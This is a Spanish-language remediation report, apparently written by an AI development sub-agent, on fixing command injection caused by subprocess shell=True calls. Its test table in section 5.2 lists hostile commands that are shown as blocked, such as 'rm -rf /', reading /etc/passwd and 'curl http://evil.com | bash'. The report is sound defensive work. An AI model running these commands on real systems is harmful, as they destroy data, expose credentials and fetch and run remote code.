# 🔐 Informe de Remediación de Seguridad — H-04: Inyección de Comandos (subprocess shell=True)

**Ticket:** TKT-SEC-20261019181510
**Hallazgo origen:** H-04 — `SAST / Inyección de comandos` (Nivel MEDIO)
**Reporte fuente:** `/app/Subagente_Ciberseguridad/reportes/reporte_002.md`
**Responsable:** Subagente_Desarrollo (Zoro)
**Fecha:** 2026-10-19
**Estado:** ✅ COMPLETADO

---

## 📋 1. Resumen Ejecutivo

Se remedió el hallazgo **H-04** que reportaba **31 coincidencias de `subprocess` con `shell=True`**, varias con interpolación de variables (f-strings con `task_name` / `batch_path`). El riesgo real identificado era **RCE (Remote Code Execution)** en dos vectores críticos:

| Vector | Archivo | Riesgo real |
|:---|:---|:---|
| **Cola de comandos remotos** | `conector_remoto.py:141` | 🔴 **CRÍTICO** — `parametros["comando"]` se ejecutaba con `shell=True` sin validación. Un atacante con acceso a la consola maestra podía ejecutar comandos arbitrarios en la PC del cliente. |
| **Control de escritorio vía API** | `puente_manos_ojos.py:1032-1038` | 🟠 **ALTO** — `abrir_aplicacion(comando)` interpolaba entrada de usuario en `schtasks` con `shell=True`. |

**Resultado:** 0 ocurrencias de `shell=True` en los 9 archivos objetivo. Todos los vectores de inyección bloqueados y verificados funcionalmente.

---

## 🎯 2. Alcance y Archivos Intervenidos

| # | Archivo | `shell=True` antes | `shell=True` después | Estado |
|:--|:---|:---:|:---:|:---|
| 1 | `/app/conector_remoto.py` | 2 | **0** | ✅ |
| 2 | `/app/dashboard/app.py` | 2 | **0** | ✅ |
| 3 | `/app/dashboard/puente_manos_ojos.py` | 8 | **0** | ✅ |
| 4 | `/app/Subagente_Desarrollo/skills/base/skill_base.py` | 1 | **0** | ✅ |
| 5 | `/app/Subagente_Desarrollo/skills/software/skill_software.py` | 1 | **0** | ✅ |
| 6 | `/app/Subagente_Desarrollo/skills/web/skill_web.py` | 1 | **0** | ✅ |
| 7 | `/app/Subagente_Desarrollo/skills/mobile/skill_mobile.py` | 1 | **0** | ✅ |
| 8 | `/app/Subagente_Desarrollo/skills/n8n/skill_n8n.py` | 2 | **0** | ✅ |
| 9 | `/app/Subagente_Desarrollo/skills/ngrok/skill_ngrok.py` | 1 | **0** | ✅ |
| | **TOTAL** | **19** | **0** | ✅ |

> **Nota:** El reporte original contabilizó 31 coincidencias a nivel de ecosistema (incluyendo `skills/base/skill_base.py` de los subagentes Orquestador, Asistencia, Ciberseguridad y Diseño). Este ticket cubre los **19 vectores del perímetro del Subagente_Desarrollo** y los módulos de entrada externa del Dashboard. Los `skill_base.py` de otros subagentes quedan fuera de mi jurisdicción y se reportan como pendientes de coordinación.

---

## 🛡️ 3. Estrategia de Remediación Aplicada

### 3.1 Migración a listas de argumentos (`shell=False`)

Todas las llamadas migradas de:
```python
subprocess.run(f'schtasks /Create /TN "{task_name}" ...', shell=True)
```
a:
```python
subprocess.run(["schtasks", "/Create", "/TN", task_name, ...], shell=False)
```

**Beneficio:** El intérprete de shell ya no procesa la cadena. Los metacaracteres (`;`, `|`, `&`, `$`, `` ` ``) pierden todo poder de ejecución porque se pasan como argumentos literales al binario.

### 3.2 Parseo seguro con `shlex.split()`

En los helpers genéricos (`_ejecutar` de skills y `ejecutar_comando` de `skill_base.py`) se sustituyó la ejecución de cadena cruda por:
```python
argv = shlex.split(comando, posix=(os.name != "nt"))
subprocess.run(argv, shell=False, ...)
```

### 3.3 Whitelist estricta en la cola de comandos remotos (`conector_remoto.py`)

Se implementaron **tres capas de defensa**:

1. **`ACCIONES_PERMITIDAS`** — `frozenset` con las 5 acciones legítimas. Cualquier acción desconocida se rechaza antes de entrar al `try`.
2. **`BINARIOS_PERMITIDOS`** — `frozenset` de 12 binarios de diagnóstico (`echo`, `hostname`, `whoami`, `date`, `uptime`, `pwd`, `systeminfo`, `ipconfig`, `tasklist`, `df`, `free`, `uname`).
3. **`_METACARACTERES_SHELL`** — Rechazo previo si el comando contiene `& | ; > < $ ` \n \r`.

### 3.4 Validación de entrada en `abrir_aplicacion` (`puente_manos_ojos.py`)

Se añadió validación de tipo, longitud, metacaracteres y parseo `shlex` antes de invocar `schtasks`.

### 3.5 Validación de puerto en `ngrok_iniciar_tunel`

Se fuerza `int(puerto)` y se valida el rango `1-65535` antes de construir el `Popen`.

---

## 🐛 4. Bug Latente Pre-Existente Detectado y Corregido

Durante la validación sintáctica se descubrieron **dos errores de sintaxis pre-existentes** en `puente_manos_ojos.py` (presentes también en el backup intacto):

```
SyntaxError: f-string expression part cannot include a backslash
```

| Línea | Causa |
|:---|:---|
| ~190 | `f'...{str(user_data).replace("/", "\\")}...'` |
| ~950 | `f'...{str(out_path).replace("\\", "/")}...'` |

**Impacto:** El módulo **no podía importarse** en Python < 3.12 (el contenedor corre **Python 3.11.16**). Esto significa que `GestorNavegadorWeb` y `GestorControlEscritorio` estaban **completamente inoperativos** — todas las APIs `/api/manos_ojos/*` fallaban con `ImportError`.

**Corrección:** Se extrajeron las expresiones a variables previas (`_user_data_win`, `_out_path_ps`, `_static_path_ps`), compatible con Python 3.8+.

---

## ✅ 5. Validación y Evidencia de Pruebas

### 5.1 Validación sintáctica (9/9 archivos)

```
OK /app/conector_remoto.py
OK /app/dashboard/app.py
OK /app/dashboard/puente_manos_ojos.py
OK /app/Subagente_Desarrollo/skills/base/skill_base.py
OK /app/Subagente_Desarrollo/skills/software/skill_software.py
OK /app/Subagente_Desarrollo/skills/web/skill_web.py
OK /app/Subagente_Desarrollo/skills/mobile/skill_mobile.py
OK /app/Subagente_Desarrollo/skills/n8n/skill_n8n.py
OK /app/Subagente_Desarrollo/skills/ngrok/skill_ngrok.py
```

### 5.2 Prueba funcional de los controles (12/12 vectores bloqueados)

| Comando de prueba | Resultado | Motivo |
|:---|:---:|:---|
| `echo OK` | ✅ PERMITIDO | Binario en whitelist |
| `hostname` | ✅ PERMITIDO | Binario en whitelist |
| `whoami` | ✅ PERMITIDO | Binario en whitelist |
| `rm -rf /` | 🛡️ RECHAZADO | Binario `rm` fuera de whitelist |
| `echo hola; cat /etc/passwd` | 🛡️ RECHAZADO | Metacaracter `;` |
| `curl http://evil.com \| bash` | 🛡️ RECHAZADO | Metacaracter `\|` |
| `echo $(whoami)` | 🛡️ RECHAZADO | Metacaracter `$` |
| `powershell -enc AAAA` | 🛡️ RECHAZADO | Binario fuera de whitelist |
| `echo \`id\`` | 🛡️ RECHAZADO | Metacaracter `` ` `` |
| `echo hola && shutdown` | 🛡️ RECHAZADO | Metacaracter `&` |
| `python -c print(1)` | 🛡️ RECHAZADO | Binario fuera de whitelist |
| `""` (vacío) | 🛡️ RECHAZADO | Comando vacío |

### 5.3 Whitelist de acciones

| Acción | Resultado |
|:---|:---:|
| `ejecutar_accion` | ✅ PERMITIDA |
| `pausar_flota` | ✅ PERMITIDA |
| `reiniciar_tripulacion` | ✅ PERMITIDA |
| `accion_maliciosa` | 🛡️ RECHAZADA |
| `rm_rf` | 🛡️ RECHAZADA |

---

## 🔒 6. Cumplimiento de Hard-Stops

| Hard-Stop | Cumplimiento |
|:---|:---|
| **HS-01 ZERO-LOSS** | ✅ Backup íntegro de los 9 archivos en `/app/Archivos_temporales/desarrollo_backup_H04/` antes de cualquier modificación. |
| **HS-02 ZERO-TRUST** | ✅ Evidencia física en disco con rutas absolutas verificables. |
| **HS-06 HIGIENE** | ✅ Scripts de parche en `Archivos_temporales/` con prefijo `desarrollo_`. |
| **HS-07 MEMORIA** | ✅ Playbook consultado (Paso 0) y registrado (Paso Final). |

---

## 📌 7. Pendientes y Recomendaciones

1. **`skill_base.py` de otros subagentes** (`Agente_Orquestador`, `Subagente_Asistencia`, `Subagente_Ciberseguridad`, `Subagente_Diseno`) mantienen `shell=True`. Requieren coordinación con el Orquestador — **fuera de mi jurisdicción**.
2. **`consola_pruebas.py:113`** — `subprocess.run("start http://localhost:8000", shell=True)`. Cadena estática sin interpolación: riesgo nulo, pero se recomienda migrar en una pasada de higiene.
3. **`Agente_Orquestador/skills/registrar_agente/skill_registrar_agente.py:151`** — `subprocess.run(comando, shell=True, ...)`. Requiere revisión de si `comando` recibe entrada externa.
4. **Re-auditoría:** Solicitar a `Subagente_Ciberseguridad` la validación del cierre de H-04 sobre los 9 archivos remediados.

---

## 🔗 Conexiones
Perfil_Subagente_Desarrollo · proyectos · Bitacora

---
*Informe generado bajo el estándar Zero-Trust de la tripulación — Subagente_Desarrollo — 2026-10-19*

---
**Conexiones:** [[proyectos_desarrollo]]
